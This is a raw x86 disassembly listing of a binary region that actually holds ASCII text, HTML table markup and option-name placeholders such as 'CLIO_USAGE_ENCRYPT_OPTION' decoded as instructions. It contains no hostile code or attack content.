1100bcac:	arpl   WORD PTR [edx+0x65],dx
1100bcaf:	jae    0x1100bd20
1100bcb1:	jne    0x1100bd25
1100bcb3:	arpl   WORD PTR [ebp+0x20],sp
1100bcb6:	fs popa 
1100bcb8:	je     0x1100bd1b
1100bcba:	push   edx
1100bcbb:	outs   dx,DWORD PTR ds:[esi]
1100bcbc:	ja     0x1100bd11
1100bcbe:	je     0x1100bd39
1100bcc0:	ins    BYTE PTR es:[edi],dx
1100bcc1:	gs jge 0x1100bce6
1100bcc4:	ds or  eax,0x2020200a
1100bcca:	and    BYTE PTR [eax],ah
1100bccc:	and    BYTE PTR [esp+edx*2],bh
1100bccf:	popa   
1100bcd0:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100bcd4:	outs   dx,DWORD PTR ds:[esi]
1100bcd5:	ja     0x1100bd15
1100bcd7:	or     eax,0x2020200a
1100bcdc:	and    BYTE PTR [eax],ah
1100bcde:	and    BYTE PTR [eax],ah
1100bce0:	and    BYTE PTR [esp+edx*2],bh
1100bce3:	popa   
1100bce4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100bce8:	gs ins BYTE PTR es:[edi],dx
1100bcea:	ins    BYTE PTR es:[edi],dx
1100bceb:	ds or  eax,0x2020200a
1100bcf1:	and    BYTE PTR [eax],ah
1100bcf3:	and    BYTE PTR [eax],ah
1100bcf5:	and    BYTE PTR [eax],ah
1100bcf7:	and    BYTE PTR [eax+edx*2],bh
1100bcfa:	popa   
1100bcfb:	jb     0x1100bd5e
1100bcfd:	addr16 jb 0x1100bd61
1100bd00:	jo     0x1100bd6a
1100bd02:	and    BYTE PTR [esi+0x6f],al
1100bd05:	jb     0x1100bd6c
1100bd07:	addr16 jb 0x1100bd79
1100bd0a:	jne    0x1100bd7a
1100bd0c:	fs cmp eax,0x756c4222
1100bd12:	and    bh,BYTE PTR gs:[esi]
1100bd15:	inc    ebx
1100bd16:	dec    esp
1100bd17:	dec    ecx
1100bd18:	pop    edi
1100bd19:	push   ebp
1100bd1a:	push   ebx
1100bd1b:	inc    ecx
1100bd1c:	inc    edi
1100bd1d:	inc    ebp
1100bd1e:	pop    edi
1100bd1f:	inc    ebp
1100bd20:	dec    esi
1100bd21:	inc    ebx
1100bd22:	push   edx
1100bd23:	pop    ecx
1100bd24:	push   eax
1100bd25:	push   esp
1100bd26:	pop    edi
1100bd27:	dec    edi
1100bd28:	push   eax
1100bd29:	push   esp
1100bd2a:	dec    ecx
1100bd2b:	dec    edi
1100bd2c:	dec    esi
1100bd2d:	cmp    al,0x2f
1100bd2f:	push   eax
1100bd30:	popa   
1100bd31:	jb     0x1100bd94
1100bd33:	addr16 jb 0x1100bd97
1100bd36:	jo     0x1100bda0
1100bd38:	ds or  eax,0x2020200a
1100bd3e:	and    BYTE PTR [eax],ah
1100bd40:	and    BYTE PTR [eax],ah
1100bd42:	and    BYTE PTR [edi+ebp*1],bh
1100bd45:	push   esp
1100bd46:	popa   
1100bd47:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100bd4b:	gs ins BYTE PTR es:[edi],dx
1100bd4d:	ins    BYTE PTR es:[edi],dx
1100bd4e:	ds or  eax,0x2020200a
1100bd54:	and    BYTE PTR [eax],ah
1100bd56:	and    BYTE PTR [eax],ah
1100bd58:	and    BYTE PTR [esp+edx*2],bh
1100bd5b:	popa   
1100bd5c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100bd60:	gs ins BYTE PTR es:[edi],dx
1100bd62:	ins    BYTE PTR es:[edi],dx
1100bd63:	ds or  eax,0x2020200a
1100bd69:	and    BYTE PTR [eax],ah
1100bd6b:	and    BYTE PTR [eax],ah
1100bd6d:	and    BYTE PTR [eax],ah
1100bd6f:	and    BYTE PTR [eax+edx*2],bh
1100bd72:	popa   
1100bd73:	jb     0x1100bdd6
1100bd75:	addr16 jb 0x1100bdd9
1100bd78:	jo     0x1100bde2
1100bd7a:	ds inc ebx
1100bd7c:	dec    esp
1100bd7d:	dec    ecx
1100bd7e:	pop    edi
1100bd7f:	push   ebp
1100bd80:	push   ebx
1100bd81:	inc    ecx
1100bd82:	inc    edi
1100bd83:	inc    ebp
1100bd84:	pop    edi
1100bd85:	inc    ebp
1100bd86:	dec    esi
1100bd87:	inc    ebx
1100bd88:	push   edx
1100bd89:	pop    ecx
1100bd8a:	push   eax
1100bd8b:	push   esp
1100bd8c:	pop    edi
1100bd8d:	dec    edi
1100bd8e:	push   eax
1100bd8f:	push   esp
1100bd90:	dec    ecx
1100bd91:	dec    edi
1100bd92:	dec    esi
1100bd93:	pop    edi
1100bd94:	inc    esp
1100bd95:	inc    ebp
1100bd96:	push   ebx
1100bd97:	inc    ebx
1100bd98:	cmp    al,0x2f
1100bd9a:	push   eax
1100bd9b:	popa   
1100bd9c:	jb     0x1100bdff
1100bd9e:	addr16 jb 0x1100be02
1100bda1:	jo     0x1100be0b
1100bda3:	ds or  eax,0x2020200a
1100bda9:	and    BYTE PTR [eax],ah
1100bdab:	and    BYTE PTR [eax],ah
1100bdad:	and    BYTE PTR [edi+ebp*1],bh
1100bdb0:	push   esp
1100bdb1:	popa   
1100bdb2:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100bdb6:	gs ins BYTE PTR es:[edi],dx
1100bdb8:	ins    BYTE PTR es:[edi],dx
1100bdb9:	ds or  eax,0x2020200a
1100bdbf:	and    BYTE PTR [eax],ah
1100bdc1:	and    BYTE PTR [edi+ebp*1],bh
1100bdc4:	push   esp
1100bdc5:	popa   
1100bdc6:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100bdca:	outs   dx,DWORD PTR ds:[esi]
1100bdcb:	ja     0x1100be0b
1100bdcd:	or     eax,0x200a0d0a
1100bdd2:	and    BYTE PTR [eax],ah
1100bdd4:	and    BYTE PTR [eax],ah
1100bdd6:	and    BYTE PTR [esp+edx*2],bh
1100bdd9:	popa   
1100bdda:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100bdde:	outs   dx,DWORD PTR ds:[esi]
1100bddf:	ja     0x1100be1f
1100bde1:	or     eax,0x2020200a
1100bde6:	and    BYTE PTR [eax],ah
1100bde8:	and    BYTE PTR [eax],ah
1100bdea:	and    BYTE PTR [esp+edx*2],bh
1100bded:	popa   
1100bdee:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100bdf2:	gs ins BYTE PTR es:[edi],dx
1100bdf4:	ins    BYTE PTR es:[edi],dx
1100bdf5:	and    BYTE PTR [ebx+0x6f],al
1100bdf8:	ins    BYTE PTR es:[edi],dx
1100bdf9:	jne    0x1100be68
1100bdfb:	outs   dx,BYTE PTR ds:[esi]
1100bdfc:	push   ebx
1100bdfd:	jo     0x1100be60
1100bdff:	outs   dx,BYTE PTR ds:[esi]
1100be00:	cmp    eax,0x3e223222
1100be05:	or     eax,0x2020200a
1100be0a:	and    BYTE PTR [eax],ah
1100be0c:	and    BYTE PTR [eax],ah
1100be0e:	and    BYTE PTR [edi+ebp*1],bh
1100be11:	push   esp
1100be12:	popa   
1100be13:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100be17:	gs ins BYTE PTR es:[edi],dx
1100be19:	ins    BYTE PTR es:[edi],dx
1100be1a:	ds or  eax,0x2020200a
1100be20:	and    BYTE PTR [eax],ah
1100be22:	and    BYTE PTR [edi+ebp*1],bh
1100be25:	push   esp
1100be26:	popa   
1100be27:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100be2b:	outs   dx,DWORD PTR ds:[esi]
1100be2c:	ja     0x1100be6c
1100be2e:	or     eax,0x2020200a
1100be33:	and    BYTE PTR [edi+ebp*1],bh
1100be36:	push   esp
1100be37:	popa   
1100be38:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100be3c:	outs   dx,DWORD PTR ds:[esi]
1100be3d:	ja     0x1100be86
1100be3f:	jb     0x1100beb0
1100be41:	jne    0x1100beb3
1100be43:	ds or  eax,0x200a0d0a
1100be49:	and    BYTE PTR [eax],ah
1100be4b:	and    BYTE PTR [esp+edx*2],bh
1100be4e:	popa   
1100be4f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100be53:	outs   dx,DWORD PTR ds:[esi]
1100be54:	ja     0x1100be9d
1100be56:	jb     0x1100bec7
1100be58:	jne    0x1100beca
1100be5a:	and    BYTE PTR [ebx+0x74],dl
1100be5d:	jns    0x1100becb
1100be5f:	gs cmp eax,0x74537b22
1100be65:	popa   
1100be66:	je     0x1100bed1
1100be68:	arpl   WORD PTR [edx+0x65],dx
1100be6b:	jae    0x1100bedc
1100be6d:	jne    0x1100bee1
1100be6f:	arpl   WORD PTR [ebp+0x20],sp
1100be72:	push   0x65646165
1100be77:	jb     0x1100bebf
1100be79:	outs   dx,DWORD PTR ds:[esi]
1100be7a:	outs   dx,DWORD PTR ds:[esi]
1100be7b:	je     0x1100bee2
1100be7d:	jb     0x1100bed1
1100be7f:	outs   dx,DWORD PTR ds:[esi]
1100be80:	ja     0x1100bed5
1100be82:	je     0x1100befd
1100be84:	ins    BYTE PTR es:[edi],dx
1100be85:	gs jge 0x1100beaa
1100be88:	ds or  eax,0x2020200a
1100be8e:	and    BYTE PTR [eax],ah
1100be90:	and    BYTE PTR [esp+edx*2],bh
1100be93:	popa   
1100be94:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100be98:	outs   dx,DWORD PTR ds:[esi]
1100be99:	ja     0x1100bed9
1100be9b:	or     eax,0x2020200a
1100bea0:	and    BYTE PTR [eax],ah
1100bea2:	and    BYTE PTR [eax],ah
1100bea4:	and    BYTE PTR [esp+edx*2],bh
1100bea7:	popa   
1100bea8:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100beac:	gs ins BYTE PTR es:[edi],dx
1100beae:	ins    BYTE PTR es:[edi],dx
1100beaf:	and    BYTE PTR [ebx+0x6f],al
1100beb2:	ins    BYTE PTR es:[edi],dx
1100beb3:	jne    0x1100bf22
1100beb5:	outs   dx,BYTE PTR ds:[esi]
1100beb6:	push   ebx
1100beb7:	jo     0x1100bf1a
1100beb9:	outs   dx,BYTE PTR ds:[esi]
1100beba:	cmp    eax,0x3e223222
1100bebf:	or     eax,0x2020200a
1100bec4:	and    BYTE PTR [eax],ah
1100bec6:	and    BYTE PTR [eax],ah
1100bec8:	and    BYTE PTR [eax],ah
1100beca:	and    BYTE PTR [eax+edx*2],bh
1100becd:	popa   
1100bece:	jb     0x1100bf31
1100bed0:	addr16 jb 0x1100bf34
1100bed3:	jo     0x1100bf3d
1100bed5:	ds inc ebx
1100bed7:	dec    esp
1100bed8:	dec    ecx
1100bed9:	pop    edi
1100beda:	push   ebp
1100bedb:	push   ebx
1100bedc:	inc    ecx
1100bedd:	inc    edi
1100bede:	inc    ebp
1100bedf:	pop    edi
1100bee0:	inc    ebp
1100bee1:	pop    eax
1100bee2:	push   esp
1100bee3:	pop    edi
1100bee4:	push   eax
1100bee5:	push   edx
1100bee6:	push   ebp
1100bee7:	dec    esi
1100bee8:	dec    ecx
1100bee9:	dec    esi
1100beea:	inc    edi
1100beeb:	pop    edi
1100beec:	dec    edi
1100beed:	push   eax
1100beee:	push   esp
1100beef:	dec    ecx
1100bef0:	dec    edi
1100bef1:	dec    esi
1100bef2:	push   ebx
1100bef3:	cmp    al,0x2f
1100bef5:	push   eax
1100bef6:	popa   
1100bef7:	jb     0x1100bf5a
1100bef9:	addr16 jb 0x1100bf5d
1100befc:	jo     0x1100bf66
1100befe:	ds or  eax,0x2020200a
1100bf04:	and    BYTE PTR [eax],ah
1100bf06:	and    BYTE PTR [eax],ah
1100bf08:	and    BYTE PTR [edi+ebp*1],bh
1100bf0b:	push   esp
1100bf0c:	popa   
1100bf0d:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100bf11:	gs ins BYTE PTR es:[edi],dx
1100bf13:	ins    BYTE PTR es:[edi],dx
1100bf14:	ds or  eax,0x2020200a
1100bf1a:	and    BYTE PTR [eax],ah
1100bf1c:	and    BYTE PTR [edi+ebp*1],bh
1100bf1f:	push   esp
1100bf20:	popa   
1100bf21:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100bf25:	outs   dx,DWORD PTR ds:[esi]
1100bf26:	ja     0x1100bf66
1100bf28:	or     eax,0x2020200a
1100bf2d:	and    BYTE PTR [edi+ebp*1],bh
1100bf30:	push   esp
1100bf31:	popa   
1100bf32:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100bf36:	outs   dx,DWORD PTR ds:[esi]
1100bf37:	ja     0x1100bf80
1100bf39:	jb     0x1100bfaa
1100bf3b:	jne    0x1100bfad
1100bf3d:	ds or  eax,0x200a0d0a
1100bf43:	and    BYTE PTR [eax],ah
1100bf45:	and    BYTE PTR [esp+edx*2],bh
1100bf48:	popa   
1100bf49:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100bf4d:	outs   dx,DWORD PTR ds:[esi]
1100bf4e:	ja     0x1100bf97
1100bf50:	jb     0x1100bfc1
1100bf52:	jne    0x1100bfc4
1100bf54:	and    BYTE PTR [ebx+0x74],dl
1100bf57:	jns    0x1100bfc5
1100bf59:	gs cmp eax,0x74537b22
1100bf5f:	popa   
1100bf60:	je     0x1100bfcb
1100bf62:	arpl   WORD PTR [edx+0x65],dx
1100bf65:	jae    0x1100bfd6
1100bf67:	jne    0x1100bfdb
1100bf69:	arpl   WORD PTR [ebp+0x20],sp
1100bf6c:	fs popa 
1100bf6e:	je     0x1100bfd1
1100bf70:	push   edx
1100bf71:	outs   dx,DWORD PTR ds:[esi]
1100bf72:	ja     0x1100bfc7
1100bf74:	je     0x1100bfef
1100bf76:	ins    BYTE PTR es:[edi],dx
1100bf77:	gs jge 0x1100bf9c
1100bf7a:	ds or  eax,0x2020200a
1100bf80:	and    BYTE PTR [eax],ah
1100bf82:	and    BYTE PTR [esp+edx*2],bh
1100bf85:	popa   
1100bf86:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100bf8a:	outs   dx,DWORD PTR ds:[esi]
1100bf8b:	ja     0x1100bfcb
1100bf8d:	or     eax,0x2020200a
1100bf92:	and    BYTE PTR [eax],ah
1100bf94:	and    BYTE PTR [eax],ah
1100bf96:	and    BYTE PTR [esp+edx*2],bh
1100bf99:	popa   
1100bf9a:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100bf9e:	gs ins BYTE PTR es:[edi],dx
1100bfa0:	ins    BYTE PTR es:[edi],dx
1100bfa1:	ds or  eax,0x2020200a
1100bfa7:	and    BYTE PTR [eax],ah
1100bfa9:	and    BYTE PTR [eax],ah
1100bfab:	and    BYTE PTR [eax],ah
1100bfad:	and    BYTE PTR [eax+edx*2],bh
1100bfb0:	popa   
1100bfb1:	jb     0x1100c014
1100bfb3:	addr16 jb 0x1100c017
1100bfb6:	jo     0x1100c020
1100bfb8:	and    BYTE PTR [esi+0x6f],al
1100bfbb:	jb     0x1100c022
1100bfbd:	addr16 jb 0x1100c02f
1100bfc0:	jne    0x1100c030
1100bfc2:	fs cmp eax,0x756c4222
1100bfc8:	and    bh,BYTE PTR gs:[esi]
1100bfcb:	inc    ebx
1100bfcc:	dec    esp
1100bfcd:	dec    ecx
1100bfce:	pop    edi
1100bfcf:	push   ebp
1100bfd0:	push   ebx
1100bfd1:	inc    ecx
1100bfd2:	inc    edi
1100bfd3:	inc    ebp
1100bfd4:	pop    edi
1100bfd5:	push   eax
1100bfd6:	push   edx
1100bfd7:	push   ebp
1100bfd8:	dec    esi
1100bfd9:	inc    ebp
1100bfda:	pop    edi
1100bfdb:	dec    edi
1100bfdc:	push   eax
1100bfdd:	push   esp
1100bfde:	dec    ecx
1100bfdf:	dec    edi
1100bfe0:	dec    esi
1100bfe1:	cmp    al,0x2f
1100bfe3:	push   eax
1100bfe4:	popa   
1100bfe5:	jb     0x1100c048
1100bfe7:	addr16 jb 0x1100c04b
1100bfea:	jo     0x1100c054
1100bfec:	ds or  eax,0x2020200a
1100bff2:	and    BYTE PTR [eax],ah
1100bff4:	and    BYTE PTR [eax],ah
1100bff6:	and    BYTE PTR [edi+ebp*1],bh
1100bff9:	push   esp
1100bffa:	popa   
1100bffb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100bfff:	gs ins BYTE PTR es:[edi],dx
1100c001:	ins    BYTE PTR es:[edi],dx
1100c002:	ds or  eax,0x2020200a
1100c008:	and    BYTE PTR [eax],ah
1100c00a:	and    BYTE PTR [eax],ah
1100c00c:	and    BYTE PTR [esp+edx*2],bh
1100c00f:	popa   
1100c010:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c014:	gs ins BYTE PTR es:[edi],dx
1100c016:	ins    BYTE PTR es:[edi],dx
1100c017:	ds or  eax,0x2020200a
1100c01d:	and    BYTE PTR [eax],ah
1100c01f:	and    BYTE PTR [eax],ah
1100c021:	and    BYTE PTR [eax],ah
1100c023:	and    BYTE PTR [eax+edx*2],bh
1100c026:	popa   
1100c027:	jb     0x1100c08a
1100c029:	addr16 jb 0x1100c08d
1100c02c:	jo     0x1100c096
1100c02e:	ds inc ebx
1100c030:	dec    esp
1100c031:	dec    ecx
1100c032:	pop    edi
1100c033:	push   ebp
1100c034:	push   ebx
1100c035:	inc    ecx
1100c036:	inc    edi
1100c037:	inc    ebp
1100c038:	pop    edi
1100c039:	push   eax
1100c03a:	push   edx
1100c03b:	push   ebp
1100c03c:	dec    esi
1100c03d:	inc    ebp
1100c03e:	pop    edi
1100c03f:	dec    edi
1100c040:	push   eax
1100c041:	push   esp
1100c042:	dec    ecx
1100c043:	dec    edi
1100c044:	dec    esi
1100c045:	pop    edi
1100c046:	inc    esp
1100c047:	inc    ebp
1100c048:	push   ebx
1100c049:	inc    ebx
1100c04a:	cmp    al,0x2f
1100c04c:	push   eax
1100c04d:	popa   
1100c04e:	jb     0x1100c0b1
1100c050:	addr16 jb 0x1100c0b4
1100c053:	jo     0x1100c0bd
1100c055:	ds or  eax,0x2020200a
1100c05b:	and    BYTE PTR [eax],ah
1100c05d:	and    BYTE PTR [eax],ah
1100c05f:	and    BYTE PTR [edi+ebp*1],bh
1100c062:	push   esp
1100c063:	popa   
1100c064:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c068:	gs ins BYTE PTR es:[edi],dx
1100c06a:	ins    BYTE PTR es:[edi],dx
1100c06b:	ds or  eax,0x2020200a
1100c071:	and    BYTE PTR [eax],ah
1100c073:	and    BYTE PTR [edi+ebp*1],bh
1100c076:	push   esp
1100c077:	popa   
1100c078:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c07c:	outs   dx,DWORD PTR ds:[esi]
1100c07d:	ja     0x1100c0bd
1100c07f:	or     eax,0x200a0d0a
1100c084:	and    BYTE PTR [eax],ah
1100c086:	and    BYTE PTR [eax],ah
1100c088:	and    BYTE PTR [esp+edx*2],bh
1100c08b:	popa   
1100c08c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c090:	outs   dx,DWORD PTR ds:[esi]
1100c091:	ja     0x1100c0d1
1100c093:	or     eax,0x2020200a
1100c098:	and    BYTE PTR [eax],ah
1100c09a:	and    BYTE PTR [eax],ah
1100c09c:	and    BYTE PTR [esp+edx*2],bh
1100c09f:	popa   
1100c0a0:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c0a4:	gs ins BYTE PTR es:[edi],dx
1100c0a6:	ins    BYTE PTR es:[edi],dx
1100c0a7:	and    BYTE PTR [ebx+0x6f],al
1100c0aa:	ins    BYTE PTR es:[edi],dx
1100c0ab:	jne    0x1100c11a
1100c0ad:	outs   dx,BYTE PTR ds:[esi]
1100c0ae:	push   ebx
1100c0af:	jo     0x1100c112
1100c0b1:	outs   dx,BYTE PTR ds:[esi]
1100c0b2:	cmp    eax,0x3e223222
1100c0b7:	or     eax,0x2020200a
1100c0bc:	and    BYTE PTR [eax],ah
1100c0be:	and    BYTE PTR [eax],ah
1100c0c0:	and    BYTE PTR [edi+ebp*1],bh
1100c0c3:	push   esp
1100c0c4:	popa   
1100c0c5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c0c9:	gs ins BYTE PTR es:[edi],dx
1100c0cb:	ins    BYTE PTR es:[edi],dx
1100c0cc:	ds or  eax,0x2020200a
1100c0d2:	and    BYTE PTR [eax],ah
1100c0d4:	and    BYTE PTR [edi+ebp*1],bh
1100c0d7:	push   esp
1100c0d8:	popa   
1100c0d9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c0dd:	outs   dx,DWORD PTR ds:[esi]
1100c0de:	ja     0x1100c11e
1100c0e0:	or     eax,0x2020200a
1100c0e5:	and    BYTE PTR [edi+ebp*1],bh
1100c0e8:	push   esp
1100c0e9:	popa   
1100c0ea:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c0ee:	outs   dx,DWORD PTR ds:[esi]
1100c0ef:	ja     0x1100c138
1100c0f1:	jb     0x1100c162
1100c0f3:	jne    0x1100c165
1100c0f5:	ds or  eax,0x200a0d0a
1100c0fb:	and    BYTE PTR [eax],ah
1100c0fd:	and    BYTE PTR [esp+edx*2],bh
1100c100:	popa   
1100c101:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c105:	outs   dx,DWORD PTR ds:[esi]
1100c106:	ja     0x1100c14f
1100c108:	jb     0x1100c179
1100c10a:	jne    0x1100c17c
1100c10c:	and    BYTE PTR [ebx+0x74],dl
1100c10f:	jns    0x1100c17d
1100c111:	gs cmp eax,0x74537b22
1100c117:	popa   
1100c118:	je     0x1100c183
1100c11a:	arpl   WORD PTR [edx+0x65],dx
1100c11d:	jae    0x1100c18e
1100c11f:	jne    0x1100c193
1100c121:	arpl   WORD PTR [ebp+0x20],sp
1100c124:	push   0x65646165
1100c129:	jb     0x1100c171
1100c12b:	outs   dx,DWORD PTR ds:[esi]
1100c12c:	outs   dx,DWORD PTR ds:[esi]
1100c12d:	je     0x1100c194
1100c12f:	jb     0x1100c183
1100c131:	outs   dx,DWORD PTR ds:[esi]
1100c132:	ja     0x1100c187
1100c134:	je     0x1100c1af
1100c136:	ins    BYTE PTR es:[edi],dx
1100c137:	gs jge 0x1100c15c
1100c13a:	ds or  eax,0x2020200a
1100c140:	and    BYTE PTR [eax],ah
1100c142:	and    BYTE PTR [esp+edx*2],bh
1100c145:	popa   
1100c146:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c14a:	outs   dx,DWORD PTR ds:[esi]
1100c14b:	ja     0x1100c18b
1100c14d:	or     eax,0x2020200a
1100c152:	and    BYTE PTR [eax],ah
1100c154:	and    BYTE PTR [eax],ah
1100c156:	and    BYTE PTR [esp+edx*2],bh
1100c159:	popa   
1100c15a:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c15e:	gs ins BYTE PTR es:[edi],dx
1100c160:	ins    BYTE PTR es:[edi],dx
1100c161:	and    BYTE PTR [ebx+0x6f],al
1100c164:	ins    BYTE PTR es:[edi],dx
1100c165:	jne    0x1100c1d4
1100c167:	outs   dx,BYTE PTR ds:[esi]
1100c168:	push   ebx
1100c169:	jo     0x1100c1cc
1100c16b:	outs   dx,BYTE PTR ds:[esi]
1100c16c:	cmp    eax,0x3e223222
1100c171:	or     eax,0x2020200a
1100c176:	and    BYTE PTR [eax],ah
1100c178:	and    BYTE PTR [eax],ah
1100c17a:	and    BYTE PTR [eax],ah
1100c17c:	and    BYTE PTR [eax+edx*2],bh
1100c17f:	popa   
1100c180:	jb     0x1100c1e3
1100c182:	addr16 jb 0x1100c1e6
1100c185:	jo     0x1100c1ef
1100c187:	ds inc ebx
1100c189:	dec    esp
1100c18a:	dec    ecx
1100c18b:	pop    edi
1100c18c:	push   ebp
1100c18d:	push   ebx
1100c18e:	inc    ecx
1100c18f:	inc    edi
1100c190:	inc    ebp
1100c191:	pop    edi
1100c192:	inc    ebp
1100c193:	pop    eax
1100c194:	push   esp
1100c195:	pop    edi
1100c196:	dec    esp
1100c197:	dec    ecx
1100c198:	dec    esi
1100c199:	dec    ebx
1100c19a:	dec    ecx
1100c19b:	dec    esi
1100c19c:	inc    edi
1100c19d:	pop    edi
1100c19e:	dec    edi
1100c19f:	push   eax
1100c1a0:	push   esp
1100c1a1:	dec    ecx
1100c1a2:	dec    edi
1100c1a3:	dec    esi
1100c1a4:	push   ebx
1100c1a5:	cmp    al,0x2f
1100c1a7:	push   eax
1100c1a8:	popa   
1100c1a9:	jb     0x1100c20c
1100c1ab:	addr16 jb 0x1100c20f
1100c1ae:	jo     0x1100c218
1100c1b0:	ds or  eax,0x2020200a
1100c1b6:	and    BYTE PTR [eax],ah
1100c1b8:	and    BYTE PTR [eax],ah
1100c1ba:	and    BYTE PTR [edi+ebp*1],bh
1100c1bd:	push   esp
1100c1be:	popa   
1100c1bf:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c1c3:	gs ins BYTE PTR es:[edi],dx
1100c1c5:	ins    BYTE PTR es:[edi],dx
1100c1c6:	ds or  eax,0x2020200a
1100c1cc:	and    BYTE PTR [eax],ah
1100c1ce:	and    BYTE PTR [edi+ebp*1],bh
1100c1d1:	push   esp
1100c1d2:	popa   
1100c1d3:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c1d7:	outs   dx,DWORD PTR ds:[esi]
1100c1d8:	ja     0x1100c218
1100c1da:	or     eax,0x2020200a
1100c1df:	and    BYTE PTR [edi+ebp*1],bh
1100c1e2:	push   esp
1100c1e3:	popa   
1100c1e4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c1e8:	outs   dx,DWORD PTR ds:[esi]
1100c1e9:	ja     0x1100c232
1100c1eb:	jb     0x1100c25c
1100c1ed:	jne    0x1100c25f
1100c1ef:	ds or  eax,0x200a0d0a
1100c1f5:	and    BYTE PTR [eax],ah
1100c1f7:	and    BYTE PTR [esp+edx*2],bh
1100c1fa:	popa   
1100c1fb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c1ff:	outs   dx,DWORD PTR ds:[esi]
1100c200:	ja     0x1100c249
1100c202:	jb     0x1100c273
1100c204:	jne    0x1100c276
1100c206:	and    BYTE PTR [ebx+0x74],dl
1100c209:	jns    0x1100c277
1100c20b:	gs cmp eax,0x74537b22
1100c211:	popa   
1100c212:	je     0x1100c27d
1100c214:	arpl   WORD PTR [edx+0x65],dx
1100c217:	jae    0x1100c288
1100c219:	jne    0x1100c28d
1100c21b:	arpl   WORD PTR [ebp+0x20],sp
1100c21e:	fs popa 
1100c220:	je     0x1100c283
1100c222:	push   edx
1100c223:	outs   dx,DWORD PTR ds:[esi]
1100c224:	ja     0x1100c279
1100c226:	je     0x1100c2a1
1100c228:	ins    BYTE PTR es:[edi],dx
1100c229:	gs jge 0x1100c24e
1100c22c:	ds or  eax,0x2020200a
1100c232:	and    BYTE PTR [eax],ah
1100c234:	and    BYTE PTR [esp+edx*2],bh
1100c237:	popa   
1100c238:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c23c:	outs   dx,DWORD PTR ds:[esi]
1100c23d:	ja     0x1100c27d
1100c23f:	or     eax,0x2020200a
1100c244:	and    BYTE PTR [eax],ah
1100c246:	and    BYTE PTR [eax],ah
1100c248:	and    BYTE PTR [esp+edx*2],bh
1100c24b:	popa   
1100c24c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c250:	gs ins BYTE PTR es:[edi],dx
1100c252:	ins    BYTE PTR es:[edi],dx
1100c253:	ds or  eax,0x2020200a
1100c259:	and    BYTE PTR [eax],ah
1100c25b:	and    BYTE PTR [eax],ah
1100c25d:	and    BYTE PTR [eax],ah
1100c25f:	and    BYTE PTR [eax+edx*2],bh
1100c262:	popa   
1100c263:	jb     0x1100c2c6
1100c265:	addr16 jb 0x1100c2c9
1100c268:	jo     0x1100c2d2
1100c26a:	and    BYTE PTR [esi+0x6f],al
1100c26d:	jb     0x1100c2d4
1100c26f:	addr16 jb 0x1100c2e1
1100c272:	jne    0x1100c2e2
1100c274:	fs cmp eax,0x756c4222
1100c27a:	and    bh,BYTE PTR gs:[esi]
1100c27d:	inc    ebx
1100c27e:	dec    esp
1100c27f:	dec    ecx
1100c280:	pop    edi
1100c281:	push   ebp
1100c282:	push   ebx
1100c283:	inc    ecx
1100c284:	inc    edi
1100c285:	inc    ebp
1100c286:	pop    edi
1100c287:	dec    esp
1100c288:	dec    ecx
1100c289:	dec    esi
1100c28a:	dec    ebx
1100c28b:	pop    edi
1100c28c:	dec    edi
1100c28d:	push   eax
1100c28e:	push   esp
1100c28f:	dec    ecx
1100c290:	dec    edi
1100c291:	dec    esi
1100c292:	cmp    al,0x2f
1100c294:	push   eax
1100c295:	popa   
1100c296:	jb     0x1100c2f9
1100c298:	addr16 jb 0x1100c2fc
1100c29b:	jo     0x1100c305
1100c29d:	ds or  eax,0x2020200a
1100c2a3:	and    BYTE PTR [eax],ah
1100c2a5:	and    BYTE PTR [eax],ah
1100c2a7:	and    BYTE PTR [edi+ebp*1],bh
1100c2aa:	push   esp
1100c2ab:	popa   
1100c2ac:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c2b0:	gs ins BYTE PTR es:[edi],dx
1100c2b2:	ins    BYTE PTR es:[edi],dx
1100c2b3:	ds or  eax,0x2020200a
1100c2b9:	and    BYTE PTR [eax],ah
1100c2bb:	and    BYTE PTR [eax],ah
1100c2bd:	and    BYTE PTR [esp+edx*2],bh
1100c2c0:	popa   
1100c2c1:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c2c5:	gs ins BYTE PTR es:[edi],dx
1100c2c7:	ins    BYTE PTR es:[edi],dx
